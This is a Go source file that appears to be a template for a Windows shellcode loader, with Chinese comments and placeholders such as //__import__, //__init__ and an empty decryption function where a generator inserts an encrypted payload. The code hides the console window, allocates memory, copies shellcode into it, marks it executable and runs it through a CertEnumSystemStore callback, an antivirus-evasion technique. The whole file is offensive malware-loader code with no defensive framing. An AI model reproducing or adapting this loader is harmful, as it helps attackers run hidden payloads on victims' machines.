package main

import (
	"github.com/gonutz/ide/w32"
	"golang.org/x/sys/windows"
	"unsafe"
	//__import__
)


const (
	MEM_COMMIT       = 0x1000
	MEM_RESERVE      = 0x2000
	PAGE_READWRITE   = 0x04
	PAGE_ExecuteRead = 0x20
)



var (
	kernel32            = windows.NewLazyDLL("kernel32.dll")
	ntdll               = windows.NewLazyDLL("ntdll.dll")
	Crypt32             = windows.NewLazyDLL("Crypt32.dll")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	VirtualProtect      = kernel32.NewProc("VirtualProtect")
	RtlMoveMemory       = ntdll.NewProc("RtlMoveMemory")
	CertEnumSystemStore = Crypt32.NewProc("CertEnumSystemStore")
)

func closeWindows(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}
// 解密函数
func f() {}

func main() {
	// shellcode
	closeWindows(w32.SW_HIDE)
	//__init__
	// 申请一块可读可写的虚拟机内存
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	// copy shellcode到内存
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
	// 可读写内存
	oldProtect := PAGE_READWRITE
	// 设置内存属性为 可执行
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(byteSlice)), PAGE_ExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
	CertEnumSystemStore.Call(windows.CERT_SYSTEM_STORE_CURRENT_USER, 0, 0, addr)
}
